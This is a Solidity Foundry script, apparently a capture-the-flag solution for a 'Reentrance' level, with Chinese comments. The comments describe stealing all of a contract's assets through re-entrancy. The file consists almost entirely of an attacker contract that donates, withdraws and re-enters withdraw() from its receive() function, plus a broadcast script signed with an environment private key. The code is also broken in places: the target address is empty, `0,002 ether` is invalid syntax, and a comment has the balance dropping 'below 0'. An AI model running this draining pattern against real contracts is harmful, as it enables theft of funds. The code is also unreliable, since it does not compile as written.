// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "../src/Reentrance.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

// target 偷走合約所有資產
// 此合約的風險, withdraw function 沒有先更新合約的餘額狀態, 就與外部合約互動進行轉帳, 會有 re-entrancy 漏洞

// re-entrancy 步驟
// 呼叫 donate() 存入資金
// 呼叫 withdraw() 提取資金, 透過 msg.sender.call 觸發你的攻擊合約
// 讓攻擊合約再次執行 withdraw()
// 重複執行直到合約的餘額小於 0

contract attackCon {
    Reentrance public lev10Instance = Reentrance(payable());
    constructor() public payable {
        // 初始化
        // 往合約打入 0.001 eth
        lev10Instance.donate{value: 0.001 ether}(address(this));
    }
    function withdraw() external {
        // 提取我打入的資金
        lev10Instance.withdraw(0.001 ether);
        (bool result) = msg.sender.call{value: 0,002 ether}("");
    }
    receive() external payable {
        // 再次從合約提取資金
        lev10Instance.withdraw(0.001 ether);
    }
}

contract Lev10Sol is Script {
    // Reentrance public lev10Instance = Reentrance(payable());

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        attackCon attackConwhy = new attackCon{value: 0.001 ether}();
        attackConwhy.withdraw();
        vm.stopBroadcast();
    }
}
